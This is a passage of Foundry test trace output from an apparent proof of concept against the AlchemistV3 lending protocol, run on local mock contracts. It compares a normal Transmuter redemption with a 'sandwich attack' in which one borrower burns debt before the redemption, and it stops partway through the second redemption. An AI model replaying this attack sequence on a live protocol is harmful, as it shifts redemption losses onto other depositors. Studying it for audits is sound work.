    │   │   ├─ [7209] MockMYTVault::transferFrom(0x0000000000000000000000000000000000000B0b, TransparentUpgradeableProxy: [0x48c33395391C097df9c9aA887a40f1b47948D393], 100000000000000000000000 [1e23])
    │   │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000B0b, to: TransparentUpgradeableProxy: [0x48c33395391C097df9c9aA887a40f1b47948D393], value: 100000000000000000000000 [1e23])
    │   │   │   └─ ← [Return] true
    │   │   ├─ emit Deposit(amount: 100000000000000000000000 [1e23], recipientId: 2)
    │   │   ├─ [1977] MockMYTVault::convertToAssets(100000000000000000000000 [1e23]) [staticcall]
    │   │   │   └─ ← [Return] 100000000000000000000000 [1e23]
    │   │   └─ ← [Return] 100000000000000000000000 [1e23]
    │   └─ ← [Return] 100000000000000000000000 [1e23]
    ├─ [6859] AlchemistNFTHelper::getFirstTokenId(0x0000000000000000000000000000000000000B0b, AlchemistV3Position: [0x13f8F173F6CBb87B606526853092F423537395Ad]) [delegatecall]
    │   ├─ [1300] AlchemistV3Position::balanceOf(0x0000000000000000000000000000000000000B0b) [staticcall]
    │   │   └─ ← [Return] 1
    │   ├─ [1991] AlchemistV3Position::tokenOfOwnerByIndex(0x0000000000000000000000000000000000000B0b, 0) [staticcall]
    │   │   └─ ← [Return] 2
    │   └─ ← [Return] 2
    ├─ [163352] TransparentUpgradeableProxy::fallback(2, 50000000000000000000000 [5e22], 0x0000000000000000000000000000000000000B0b)
    │   ├─ [162631] AlchemistV3::mint(2, 50000000000000000000000 [5e22], 0x0000000000000000000000000000000000000B0b) [delegatecall]
    │   │   ├─ [1265] AlchemistV3Position::ownerOf(2) [staticcall]
    │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000B0b
    │   │   ├─ [1265] AlchemistV3Position::ownerOf(2) [staticcall]
    │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000B0b
    │   │   ├─ [3602] MockMYTVault::convertToShares(0) [staticcall]
    │   │   │   └─ ← [Return] 0
    │   │   ├─ [3602] MockMYTVault::convertToShares(50000000000000000000000 [5e22]) [staticcall] 
    │   │   │   └─ ← [Return] 50000000000000000000000 [5e22]
    │   │   ├─ [3602] MockMYTVault::convertToShares(0) [staticcall]
    │   │   │   └─ ← [Return] 0
    │   │   ├─ [1977] MockMYTVault::convertToAssets(100000000000000000000000 [1e23]) [staticcall]
    │   │   │   └─ ← [Return] 100000000000000000000000 [1e23]
    │   │   ├─ [28202] AlchemicTokenV3::mint(0x0000000000000000000000000000000000000B0b, 50000000000000000000000 [5e22])
    │   │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: 0x0000000000000000000000000000000000000B0b, value: 50000000000000000000000 [5e22])
    │   │   │   └─ ← [Stop]
    │   │   ├─ emit Mint(tokenId: 2, amount: 50000000000000000000000 [5e22], recipient: 0x0000000000000000000000000000000000000B0b)
    │   │   └─ ← [Stop]
    │   └─ ← [Return]
    ├─ [0] VM::stopPrank()
    │   └─ ← [Return]
    ├─ [12117] TransparentUpgradeableProxy::fallback(1) [staticcall]
    │   ├─ [11396] AlchemistV3::getCDP(1) [delegatecall]
    │   │   └─ ← [Return] 100000000000000000000000 [1e23], 50000000000000000000000 [5e22], 0     
    │   └─ ← [Return] 100000000000000000000000 [1e23], 50000000000000000000000 [5e22], 0
    ├─ [12117] TransparentUpgradeableProxy::fallback(2) [staticcall]
    │   ├─ [11396] AlchemistV3::getCDP(2) [delegatecall]
    │   │   └─ ← [Return] 100000000000000000000000 [1e23], 50000000000000000000000 [5e22], 0     
    │   └─ ← [Return] 100000000000000000000000 [1e23], 50000000000000000000000 [5e22], 0
    ├─ [0] console::log("Initial State:") [staticcall]
    │   └─ ← [Stop]
    ├─ [0] console::log("  Alice Collateral:", 100000 [1e5]) [staticcall]
    │   └─ ← [Stop]
    ├─ [0] console::log("  Alice Debt:", 50000 [5e4]) [staticcall]
    │   └─ ← [Stop]
    ├─ [0] console::log("  Bob Collateral:", 100000 [1e5]) [staticcall]
    │   └─ ← [Stop]
    ├─ [0] console::log("  Bob Debt:", 50000 [5e4]) [staticcall]
    │   └─ ← [Stop]
    ├─ [0] console::log("") [staticcall]
    │   └─ ← [Stop]
    ├─ [0] console::log("--- Scenario A: Normal Redemption (No Attack) ---") [staticcall]        
    │   └─ ← [Stop]
    ├─ [0] VM::snapshot()
    │   └─ ← [Return] 0
    ├─ [3239] AlchemicTokenV3::balanceOf(0x0000000000000000000000000000000000000DAd) [staticcall]
    │   └─ ← [Return] 200000000000000000000000 [2e23]
    ├─ [0] VM::load(AlchemicTokenV3: [0x9B137463d4E7986D7f535f9B79e28b4EF1938E9b], 0xd4a647d8ab2f8f5c4324c93b4c32e77180755e3e8aca091fe88e815818e542dd) [staticcall]
    │   └─ ← [Return] 0x000000000000000000000000000000000000000000002a5a058fc295ed000000
    ├─ [0] VM::store(AlchemicTokenV3: [0x9B137463d4E7986D7f535f9B79e28b4EF1938E9b], 0xd4a647d8ab2f8f5c4324c93b4c32e77180755e3e8aca091fe88e815818e542dd, 0x00000000000000000000000000000000000000000000021e19e0c9bab2400000)
    │   └─ ← [Return]
    ├─ [1239] AlchemicTokenV3::balanceOf(0x0000000000000000000000000000000000000DAd) [staticcall]
    │   └─ ← [Return] 10000000000000000000000 [1e22]
    ├─ [0] VM::startPrank(0x0000000000000000000000000000000000000DAd)
    │   └─ ← [Return]
    ├─ [26076] AlchemicTokenV3::approve(Transmuter: [0x2387b3383E89c164781d173B7Aa14d9c46eD2642], 10000000000000000000000 [1e22])
    │   ├─ emit Approval(owner: 0x0000000000000000000000000000000000000DAd, spender: Transmuter: [0x2387b3383E89c164781d173B7Aa14d9c46eD2642], value: 10000000000000000000000 [1e22])
    │   └─ ← [Return] true
    ├─ [1382954] Transmuter::createRedemption(10000000000000000000000 [1e22])
    │   ├─ [1295] TransparentUpgradeableProxy::fallback() [staticcall]
    │   │   ├─ [583] AlchemistV3::totalSyntheticsIssued() [delegatecall]
    │   │   │   └─ ← [Return] 100000000000000000000000 [1e23]
    │   │   └─ ← [Return] 100000000000000000000000 [1e23]
    │   ├─ [30169] AlchemicTokenV3::transferFrom(0x0000000000000000000000000000000000000DAd, Transmuter: [0x2387b3383E89c164781d173B7Aa14d9c46eD2642], 10000000000000000000000 [1e22])
    │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000DAd, to: Transmuter: [0x2387b3383E89c164781d173B7Aa14d9c46eD2642], value: 10000000000000000000000 [1e22])
    │   │   └─ ← [Return] true
    │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: 0x0000000000000000000000000000000000000DAd, tokenId: 1)
    │   ├─ emit PositionCreated(creator: 0x0000000000000000000000000000000000000DAd, amountStaked: 10000000000000000000000 [1e22], nftId: 1)
    │   └─ ← [Stop]
    ├─ [0] VM::roll(5256001 [5.256e6])
    │   └─ ← [Return]
    ├─ [646237] Transmuter::claimRedemption(1)
    │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000DAd, to: 0x0000000000000000000000000000000000000000, tokenId: 1)
    │   ├─ [1712] TransparentUpgradeableProxy::fallback() [staticcall]
    │   │   ├─ [1000] AlchemistV3::myt() [delegatecall]
    │   │   │   └─ ← [Return] MockMYTVault: [0xd7D9fC89347Cc01C7707010604E99D146AC0C3BF]
    │   │   └─ ← [Return] MockMYTVault: [0xd7D9fC89347Cc01C7707010604E99D146AC0C3BF]
    │   ├─ [3715] MockMYTVault::balanceOf(Transmuter: [0x2387b3383E89c164781d173B7Aa14d9c46eD2642]) [staticcall]
    │   │   └─ ← [Return] 0
    │   ├─ [5406] TransparentUpgradeableProxy::fallback() [staticcall]
    │   │   ├─ [4694] AlchemistV3::getTotalUnderlyingValue() [delegatecall]
    │   │   │   ├─ [1977] MockMYTVault::convertToAssets(200000000000000000000000 [2e23]) [staticcall]
    │   │   │   │   └─ ← [Return] 200000000000000000000000 [2e23]
    │   │   │   └─ ← [Return] 200000000000000000000000 [2e23]
    │   │   └─ ← [Return] 200000000000000000000000 [2e23]
    │   ├─ [4215] TransparentUpgradeableProxy::fallback(0) [staticcall]
    │   │   ├─ [3500] AlchemistV3::convertYieldTokensToUnderlying(0) [delegatecall]
    │   │   │   ├─ [1977] MockMYTVault::convertToAssets(0) [staticcall]
    │   │   │   │   └─ ← [Return] 0
    │   │   │   └─ ← [Return] 0
    │   │   └─ ← [Return] 0
    │   ├─ [5406] TransparentUpgradeableProxy::fallback() [staticcall]
    │   │   ├─ [4694] AlchemistV3::getTotalUnderlyingValue() [delegatecall]
    │   │   │   ├─ [1977] MockMYTVault::convertToAssets(200000000000000000000000 [2e23]) [staticcall]
    │   │   │   │   └─ ← [Return] 200000000000000000000000 [2e23]
    │   │   │   └─ ← [Return] 200000000000000000000000 [2e23]
    │   │   └─ ← [Return] 200000000000000000000000 [2e23]
    │   ├─ [4215] TransparentUpgradeableProxy::fallback(0) [staticcall]
    │   │   ├─ [3500] AlchemistV3::convertYieldTokensToUnderlying(0) [delegatecall]
    │   │   │   ├─ [1977] MockMYTVault::convertToAssets(0) [staticcall]
    │   │   │   │   └─ ← [Return] 0
    │   │   │   └─ ← [Return] 0
    │   │   └─ ← [Return] 0
    │   ├─ [1295] TransparentUpgradeableProxy::fallback() [staticcall]
    │   │   ├─ [583] AlchemistV3::totalSyntheticsIssued() [delegatecall]
    │   │   │   └─ ← [Return] 100000000000000000000000 [1e23]
    │   │   └─ ← [Return] 100000000000000000000000 [1e23]
    │   ├─ [3448] TransparentUpgradeableProxy::fallback() [staticcall]
    │   │   ├─ [2736] AlchemistV3::underlyingToken() [delegatecall]
    │   │   │   └─ ← [Return] TestERC20: [0xf9ee71f54F2009fD180C480e44a5176AdCABa5eA]
    │   │   └─ ← [Return] TestERC20: [0xf9ee71f54F2009fD180C480e44a5176AdCABa5eA]
    │   ├─ [2519] TestERC20::decimals() [staticcall]
    │   │   └─ ← [Return] 18
    │   ├─ [5051] TransparentUpgradeableProxy::fallback(0) [staticcall]
    │   │   ├─ [4336] AlchemistV3::convertYieldTokensToDebt(0) [delegatecall]
    │   │   │   ├─ [1977] MockMYTVault::convertToAssets(0) [staticcall]
    │   │   │   │   └─ ← [Return] 0
    │   │   │   └─ ← [Return] 0
    │   │   └─ ← [Return] 0
    │   ├─ [464505] TransparentUpgradeableProxy::fallback(10000000000000000000000 [1e22])        
    │   │   ├─ [463793] AlchemistV3::redeem(10000000000000000000000 [1e22]) [delegatecall]       
    │   │   │   ├─ [1715] MockMYTVault::balanceOf(Transmuter: [0x2387b3383E89c164781d173B7Aa14d9c46eD2642]) [staticcall]
    │   │   │   │   └─ ← [Return] 0
    │   │   │   ├─ [37644] Transmuter::queryGraph(2, 5256001 [5.256e6]) [staticcall]
    │   │   │   │   └─ ← [Return] 10000000000000000000000 [1e22]
    │   │   │   ├─ [1977] MockMYTVault::convertToAssets(0) [staticcall]
    │   │   │   │   └─ ← [Return] 0
    │   │   │   ├─ [1715] MockMYTVault::balanceOf(Transmuter: [0x2387b3383E89c164781d173B7Aa14d9c46eD2642]) [staticcall]
    │   │   │   │   └─ ← [Return] 0
    │   │   │   ├─ [1977] MockMYTVault::convertToAssets(0) [staticcall]
    │   │   │   │   └─ ← [Return] 0
    │   │   │   ├─ [3602] MockMYTVault::convertToShares(10000000000000000000000 [1e22]) [staticcall]
    │   │   │   │   └─ ← [Return] 10000000000000000000000 [1e22]
    │   │   │   ├─ [26990] MockMYTVault::transfer(Transmuter: [0x2387b3383E89c164781d173B7Aa14d9c46eD2642], 10000000000000000000000 [1e22])
    │   │   │   │   ├─ emit Transfer(from: TransparentUpgradeableProxy: [0x48c33395391C097df9c9aA887a40f1b47948D393], to: Transmuter: [0x2387b3383E89c164781d173B7Aa14d9c46eD2642], value: 10000000000000000000000 [1e22])
    │   │   │   │   └─ ← [Return] true
    │   │   │   ├─ [9090] MockMYTVault::transfer(PointEvaluation: [0x000000000000000000000000000000000000000A], 0)
    │   │   │   │   ├─ emit Transfer(from: TransparentUpgradeableProxy: [0x48c33395391C097df9c9aA887a40f1b47948D393], to: PointEvaluation: [0x000000000000000000000000000000000000000A], value: 0)
    │   │   │   │   └─ ← [Return] true
    │   │   │   ├─ emit Redemption(amount: 10000000000000000000000 [1e22])
    │   │   │   └─ ← [Stop]
    │   │   └─ ← [Return]
    │   ├─ [7021] TransparentUpgradeableProxy::fallback(10000000000000000000000 [1e22]) [staticcall]
    │   │   ├─ [6306] AlchemistV3::convertDebtTokensToYield(10000000000000000000000 [1e22]) [delegatecall]
    │   │   │   ├─ [3602] MockMYTVault::convertToShares(10000000000000000000000 [1e22]) [staticcall]
    │   │   │   │   └─ ← [Return] 10000000000000000000000 [1e22]
    │   │   │   └─ ← [Return] 10000000000000000000000 [1e22]
    │   │   └─ ← [Return] 10000000000000000000000 [1e22]
    │   ├─ [1712] TransparentUpgradeableProxy::fallback() [staticcall]
    │   │   ├─ [1000] AlchemistV3::myt() [delegatecall]
    │   │   │   └─ ← [Return] MockMYTVault: [0xd7D9fC89347Cc01C7707010604E99D146AC0C3BF]
    │   │   └─ ← [Return] MockMYTVault: [0xd7D9fC89347Cc01C7707010604E99D146AC0C3BF]
    │   ├─ [1715] MockMYTVault::balanceOf(Transmuter: [0x2387b3383E89c164781d173B7Aa14d9c46eD2642]) [staticcall]
    │   │   └─ ← [Return] 10000000000000000000000 [1e22]
    │   ├─ [1712] TransparentUpgradeableProxy::fallback() [staticcall]
    │   │   ├─ [1000] AlchemistV3::myt() [delegatecall]
    │   │   │   └─ ← [Return] MockMYTVault: [0xd7D9fC89347Cc01C7707010604E99D146AC0C3BF]
    │   │   └─ ← [Return] MockMYTVault: [0xd7D9fC89347Cc01C7707010604E99D146AC0C3BF]
    │   ├─ [11890] MockMYTVault::transfer(0x0000000000000000000000000000000000000DAd, 9990000000000000000000 [9.99e21])
    │   │   ├─ emit Transfer(from: Transmuter: [0x2387b3383E89c164781d173B7Aa14d9c46eD2642], to: 0x0000000000000000000000000000000000000DAd, value: 9990000000000000000000 [9.99e21])
    │   │   └─ ← [Return] true
    │   ├─ [1712] TransparentUpgradeableProxy::fallback() [staticcall]
    │   │   ├─ [1000] AlchemistV3::myt() [delegatecall]
    │   │   │   └─ ← [Return] MockMYTVault: [0xd7D9fC89347Cc01C7707010604E99D146AC0C3BF]
    │   │   └─ ← [Return] MockMYTVault: [0xd7D9fC89347Cc01C7707010604E99D146AC0C3BF]
    │   ├─ [28990] MockMYTVault::transfer(AlchemistV3Test: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 10000000000000000000 [1e19])
    │   │   ├─ emit Transfer(from: Transmuter: [0x2387b3383E89c164781d173B7Aa14d9c46eD2642], to: AlchemistV3Test: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 10000000000000000000 [1e19])
    │   │   └─ ← [Return] true
    │   ├─ [6329] AlchemicTokenV3::transfer(0x0000000000000000000000000000000000000DAd, 0)       
    │   │   ├─ emit Transfer(from: Transmuter: [0x2387b3383E89c164781d173B7Aa14d9c46eD2642], to: 0x0000000000000000000000000000000000000DAd, value: 0)
    │   │   └─ ← [Return] true
    │   ├─ [8329] AlchemicTokenV3::transfer(AlchemistV3Test: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0)
    │   │   ├─ emit Transfer(from: Transmuter: [0x2387b3383E89c164781d173B7Aa14d9c46eD2642], to: AlchemistV3Test: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 0)
    │   │   └─ ← [Return] true
    │   ├─ [5414] AlchemicTokenV3::burn(10000000000000000000000 [1e22])
    │   │   ├─ emit Transfer(from: Transmuter: [0x2387b3383E89c164781d173B7Aa14d9c46eD2642], to: 0x0000000000000000000000000000000000000000, value: 10000000000000000000000 [1e22])
    │   │   └─ ← [Stop]
    │   ├─ [2257] TransparentUpgradeableProxy::fallback(10000000000000000000000 [1e22])
    │   │   ├─ [1545] AlchemistV3::reduceSyntheticsIssued(10000000000000000000000 [1e22]) [delegatecall]
    │   │   │   └─ ← [Stop]
    │   │   └─ ← [Return]
    │   ├─ [1712] TransparentUpgradeableProxy::fallback() [staticcall]
    │   │   ├─ [1000] AlchemistV3::myt() [delegatecall]
    │   │   │   └─ ← [Return] MockMYTVault: [0xd7D9fC89347Cc01C7707010604E99D146AC0C3BF]
    │   │   └─ ← [Return] MockMYTVault: [0xd7D9fC89347Cc01C7707010604E99D146AC0C3BF]
    │   ├─ [1715] MockMYTVault::balanceOf(Transmuter: [0x2387b3383E89c164781d173B7Aa14d9c46eD2642]) [staticcall]
    │   │   └─ ← [Return] 0
    │   ├─ [3119] TransparentUpgradeableProxy::fallback(0)
    │   │   ├─ [2407] AlchemistV3::setTransmuterTokenBalance(0) [delegatecall]
    │   │   │   └─ ← [Stop]
    │   │   └─ ← [Return]
    │   ├─ emit PositionClaimed(claimer: 0x0000000000000000000000000000000000000DAd, amountClaimed: 9990000000000000000000 [9.99e21], amountUnclaimed: 0)
    │   └─ ← [Stop]
    ├─ [0] VM::stopPrank()
    │   └─ ← [Return]
    ├─ [175260] TransparentUpgradeableProxy::fallback(1)
    │   ├─ [174548] AlchemistV3::poke(1) [delegatecall]
    │   │   ├─ [1265] AlchemistV3Position::ownerOf(1) [staticcall]
    │   │   │   └─ ← [Return] 0x00000000000000000000000000000000000A11cE
    │   │   ├─ [3602] MockMYTVault::convertToShares(45000000000000000000000 [4.5e22]) [staticcall]
    │   │   │   └─ ← [Return] 45000000000000000000000 [4.5e22]
    │   │   └─ ← [Stop]
    │   └─ ← [Return]
    ├─ [175260] TransparentUpgradeableProxy::fallback(2)
    │   ├─ [174548] AlchemistV3::poke(2) [delegatecall]
    │   │   ├─ [1265] AlchemistV3Position::ownerOf(2) [staticcall]
    │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000B0b
    │   │   ├─ [3602] MockMYTVault::convertToShares(45000000000000000000000 [4.5e22]) [staticcall]
    │   │   │   └─ ← [Return] 45000000000000000000000 [4.5e22]
    │   │   └─ ← [Stop]
    │   └─ ← [Return]
    ├─ [57071] TransparentUpgradeableProxy::fallback(1) [staticcall]
    │   ├─ [56350] AlchemistV3::getCDP(1) [delegatecall]
    │   │   └─ ← [Return] 95000000000000000000000 [9.5e22], 45000000000000000000000 [4.5e22], 0  
    │   └─ ← [Return] 95000000000000000000000 [9.5e22], 45000000000000000000000 [4.5e22], 0      
    ├─ [57071] TransparentUpgradeableProxy::fallback(2) [staticcall]
    │   ├─ [56350] AlchemistV3::getCDP(2) [delegatecall]
    │   │   └─ ← [Return] 95000000000000000000000 [9.5e22], 45000000000000000000000 [4.5e22], 0  
    │   └─ ← [Return] 95000000000000000000000 [9.5e22], 45000000000000000000000 [4.5e22], 0      
    ├─ [0] console::log("After Normal Redemption:") [staticcall]
    │   └─ ← [Stop]
    ├─ [0] console::log("  Alice Collateral Loss:", 5000) [staticcall]
    │   └─ ← [Stop]
    ├─ [0] console::log("  Bob Collateral Loss:", 5000) [staticcall]
    │   └─ ← [Stop]
    ├─ [0] console::log("  Total Loss:", 10000 [1e4]) [staticcall]
    │   └─ ← [Stop]
    ├─ [0] console::log("") [staticcall]
    │   └─ ← [Stop]
    ├─ [0] VM::revertTo(0)
    │   └─ ← [Return] true
    ├─ [0] console::log("--- Scenario B: With Sandwich Attack ---") [staticcall]
    │   └─ ← [Stop]
    ├─ [0] VM::startPrank(0x00000000000000000000000000000000000A11cE)
    │   └─ ← [Return]
    ├─ [0] VM::roll(2)
    │   └─ ← [Return]
    ├─ [26076] AlchemicTokenV3::approve(TransparentUpgradeableProxy: [0x48c33395391C097df9c9aA887a40f1b47948D393], 25000000000000000000000 [2.5e22])
    │   ├─ emit Approval(owner: 0x00000000000000000000000000000000000A11cE, spender: TransparentUpgradeableProxy: [0x48c33395391C097df9c9aA887a40f1b47948D393], value: 25000000000000000000000 [2.5e22])
    │   └─ ← [Return] true
    ├─ [115891] TransparentUpgradeableProxy::fallback(25000000000000000000000 [2.5e22], 1)       
    │   ├─ [115173] AlchemistV3::burn(25000000000000000000000 [2.5e22], 1) [delegatecall]        
    │   │   ├─ [1265] AlchemistV3Position::ownerOf(1) [staticcall]
    │   │   │   └─ ← [Return] 0x00000000000000000000000000000000000A11cE
    │   │   ├─ [3715] MockMYTVault::balanceOf(Transmuter: [0x2387b3383E89c164781d173B7Aa14d9c46eD2642]) [staticcall]
    │   │   │   └─ ← [Return] 0
    │   │   ├─ [1298] Transmuter::queryGraph(2, 2) [staticcall]
    │   │   │   └─ ← [Return] 0
    │   │   ├─ [1977] MockMYTVault::convertToAssets(0) [staticcall]
    │   │   │   └─ ← [Return] 0
    │   │   ├─ [3602] MockMYTVault::convertToShares(50000000000000000000000 [5e22]) [staticcall] 
    │   │   │   └─ ← [Return] 50000000000000000000000 [5e22]
    │   │   ├─ [2891] Transmuter::totalLocked() [staticcall]
    │   │   │   └─ ← [Return] 0
    │   │   ├─ [10152] AlchemicTokenV3::burnFrom(0x00000000000000000000000000000000000A11cE, 25000000000000000000000 [2.5e22])
    │   │   │   ├─ emit Approval(owner: 0x00000000000000000000000000000000000A11cE, spender: TransparentUpgradeableProxy: [0x48c33395391C097df9c9aA887a40f1b47948D393], value: 0)
    │   │   │   ├─ emit Transfer(from: 0x00000000000000000000000000000000000A11cE, to: 0x0000000000000000000000000000000000000000, value: 25000000000000000000000 [2.5e22])
    │   │   │   └─ ← [Stop]
    │   │   ├─ [3602] MockMYTVault::convertToShares(25000000000000000000000 [2.5e22]) [staticcall]
    │   │   │   └─ ← [Return] 25000000000000000000000 [2.5e22]
    │   │   ├─ [3602] MockMYTVault::convertToShares(25000000000000000000000 [2.5e22]) [staticcall]
    │   │   │   └─ ← [Return] 25000000000000000000000 [2.5e22]
    │   │   ├─ [9090] MockMYTVault::transfer(PointEvaluation: [0x000000000000000000000000000000000000000A], 0)
    │   │   │   ├─ emit Transfer(from: TransparentUpgradeableProxy: [0x48c33395391C097df9c9aA887a40f1b47948D393], to: PointEvaluation: [0x000000000000000000000000000000000000000A], value: 0)    
    │   │   │   └─ ← [Return] true
    │   │   ├─ [3602] MockMYTVault::convertToShares(25000000000000000000000 [2.5e22]) [staticcall]
    │   │   │   └─ ← [Return] 25000000000000000000000 [2.5e22]
    │   │   ├─ [3602] MockMYTVault::convertToShares(25000000000000000000000 [2.5e22]) [staticcall]
    │   │   │   └─ ← [Return] 25000000000000000000000 [2.5e22]
    │   │   ├─ [3602] MockMYTVault::convertToShares(50000000000000000000000 [5e22]) [staticcall] 
    │   │   │   └─ ← [Return] 50000000000000000000000 [5e22]
    │   │   ├─ emit Burn(sender: 0x00000000000000000000000000000000000A11cE, amount: 25000000000000000000000 [2.5e22], recipientId: 1)
    │   │   └─ ← [Return] 25000000000000000000000 [2.5e22]
    │   └─ ← [Return] 25000000000000000000000 [2.5e22]
    ├─ [0] VM::stopPrank()
    │   └─ ← [Return]
    ├─ [12117] TransparentUpgradeableProxy::fallback(1) [staticcall]
    │   ├─ [11396] AlchemistV3::getCDP(1) [delegatecall]
    │   │   └─ ← [Return] 100000000000000000000000 [1e23], 25000000000000000000000 [2.5e22], 0   
    │   └─ ← [Return] 100000000000000000000000 [1e23], 25000000000000000000000 [2.5e22], 0       
    ├─ [0] console::log("After Alice Burns Debt:") [staticcall]
    │   └─ ← [Stop]
    ├─ [0] console::log("  Alice Debt Reduced:", 25000 [2.5e4]) [staticcall]
    │   └─ ← [Stop]
    ├─ [0] console::log("  Alice Collateral:", 100000 [1e5]) [staticcall]
    │   └─ ← [Stop]
    ├─ [0] console::log("") [staticcall]
    │   └─ ← [Stop]
    ├─ [0] VM::roll(3)
    │   └─ ← [Return]
    ├─ [3239] AlchemicTokenV3::balanceOf(0x0000000000000000000000000000000000000DAd) [staticcall]
    │   └─ ← [Return] 200000000000000000000000 [2e23]
    ├─ [0] VM::load(AlchemicTokenV3: [0x9B137463d4E7986D7f535f9B79e28b4EF1938E9b], 0xd4a647d8ab2f8f5c4324c93b4c32e77180755e3e8aca091fe88e815818e542dd) [staticcall]
    │   └─ ← [Return] 0x000000000000000000000000000000000000000000002a5a058fc295ed000000
    ├─ [0] VM::store(AlchemicTokenV3: [0x9B137463d4E7986D7f535f9B79e28b4EF1938E9b], 0xd4a647d8ab2f8f5c4324c93b4c32e77180755e3e8aca091fe88e815818e542dd, 0x00000000000000000000000000000000000000000000021e19e0c9bab2400000)
    │   └─ ← [Return]
    ├─ [1239] AlchemicTokenV3::balanceOf(0x0000000000000000000000000000000000000DAd) [staticcall]
    │   └─ ← [Return] 10000000000000000000000 [1e22]
    ├─ [0] VM::startPrank(0x0000000000000000000000000000000000000DAd)
    │   └─ ← [Return]
    ├─ [26076] AlchemicTokenV3::approve(Transmuter: [0x2387b3383E89c164781d173B7Aa14d9c46eD2642], 10000000000000000000000 [1e22])
    │   ├─ emit Approval(owner: 0x0000000000000000000000000000000000000DAd, spender: Transmuter: [0x2387b3383E89c164781d173B7Aa14d9c46eD2642], value: 10000000000000000000000 [1e22])
    │   └─ ← [Return] true
    ├─ [1380954] Transmuter::createRedemption(10000000000000000000000 [1e22])
    │   ├─ [1295] TransparentUpgradeableProxy::fallback() [staticcall]
    │   │   ├─ [583] AlchemistV3::totalSyntheticsIssued() [delegatecall]
    │   │   │   └─ ← [Return] 75000000000000000000000 [7.5e22]
    │   │   └─ ← [Return] 75000000000000000000000 [7.5e22]
    │   ├─ [30169] AlchemicTokenV3::transferFrom(0x0000000000000000000000000000000000000DAd, Transmuter: [0x2387b3383E89c164781d173B7Aa14d9c46eD2642], 10000000000000000000000 [1e22])
    │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000DAd, to: Transmuter: [0x2387b3383E89c164781d173B7Aa14d9c46eD2642], value: 10000000000000000000000 [1e22])
    │   │   └─ ← [Return] true
    │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: 0x0000000000000000000000000000000000000DAd, tokenId: 1)
    │   ├─ emit PositionCreated(creator: 0x0000000000000000000000000000000000000DAd, amountStaked: 10000000000000000000000 [1e22], nftId: 1)
    │   └─ ← [Stop]
    ├─ [0] VM::roll(5256003 [5.256e6])
    │   └─ ← [Return]
    ├─ [633308] Transmuter::claimRedemption(1)
    │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000DAd, to: 0x0000000000000000000000000000000000000000, tokenId: 1)
    │   ├─ [1712] TransparentUpgradeableProxy::fallback() [staticcall]
    │   │   ├─ [1000] AlchemistV3::myt() [delegatecall]
    │   │   │   └─ ← [Return] MockMYTVault: [0xd7D9fC89347Cc01C7707010604E99D146AC0C3BF]
    │   │   └─ ← [Return] MockMYTVault: [0xd7D9fC89347Cc01C7707010604E99D146AC0C3BF]
    │   ├─ [1715] MockMYTVault::balanceOf(Transmuter: [0x2387b3383E89c164781d173B7Aa14d9c46eD2642]) [staticcall]
    │   │   └─ ← [Return] 0
    │   ├─ [5406] TransparentUpgradeableProxy::fallback() [staticcall]
    │   │   ├─ [4694] AlchemistV3::getTotalUnderlyingValue() [delegatecall]
    │   │   │   ├─ [1977] MockMYTVault::convertToAssets(200000000000000000000000 [2e23]) [staticcall]
    │   │   │   │   └─ ← [Return] 200000000000000000000000 [2e23]
    │   │   │   └─ ← [Return] 200000000000000000000000 [2e23]
    │   │   └─ ← [Return] 200000000000000000000000 [2e23]
    │   ├─ [4215] TransparentUpgradeableProxy::fallback(0) [staticcall]
    │   │   ├─ [3500] AlchemistV3::convertYieldTokensToUnderlying(0) [delegatecall]
    │   │   │   ├─ [1977] MockMYTVault::convertToAssets(0) [staticcall]
    │   │   │   │   └─ ← [Return] 0
    │   │   │   └─ ← [Return] 0
    │   │   └─ ← [Return] 0
    │   ├─ [5406] TransparentUpgradeableProxy::fallback() [staticcall]
    │   │   ├─ [4694] AlchemistV3::getTotalUnderlyingValue() [delegatecall]
    │   │   │   ├─ [1977] MockMYTVault::convertToAssets(200000000000000000000000 [2e23]) [staticcall]
    │   │   │   │   └─ ← [Return] 200000000000000000000000 [2e23]
    │   │   │   └─ ← [Return] 200000000000000000000000 [2e23]
    │   │   └─ ← [Return] 200000000000000000000000 [2e23]
    │   ├─ [4215] TransparentUpgradeableProxy::fallback(0) [staticcall]
    │   │   ├─ [3500] AlchemistV3::convertYieldTokensToUnderlying(0) [delegatecall]
    │   │   │   ├─ [1977] MockMYTVault::convertToAssets(0) [staticcall]
    │   │   │   │   └─ ← [Return] 0
    │   │   │   └─ ← [Return] 0
    │   │   └─ ← [Return] 0
    │   ├─ [1295] TransparentUpgradeableProxy::fallback() [staticcall]
    │   │   ├─ [583] AlchemistV3::totalSyntheticsIssued() [delegatecall]
    │   │   │   └─ ← [Return] 75000000000000000000000 [7.5e22]
    │   │   └─ ← [Return] 75000000000000000000000 [7.5e22]
    │   ├─ [3448] TransparentUpgradeableProxy::fallback() [staticcall]
    │   │   ├─ [2736] AlchemistV3::underlyingToken() [delegatecall]
    │   │   │   └─ ← [Return] TestERC20: [0xf9ee71f54F2009fD180C480e44a5176AdCABa5eA]
    │   │   └─ ← [Return] TestERC20: [0xf9ee71f54F2009fD180C480e44a5176AdCABa5eA]
    │   ├─ [2519] TestERC20::decimals() [staticcall]
    │   │   └─ ← [Return] 18
    │   ├─ [5051] TransparentUpgradeableProxy::fallback(0) [staticcall]
    │   │   ├─ [4336] AlchemistV3::convertYieldTokensToDebt(0) [delegatecall]
    │   │   │   ├─ [1977] MockMYTVault::convertToAssets(0) [staticcall]
    │   │   │   │   └─ ← [Return] 0
    │   │   │   └─ ← [Return] 0
    │   │   └─ ← [Return] 0
    │   ├─ [453576] TransparentUpgradeableProxy::fallback(10000000000000000000000 [1e22])        
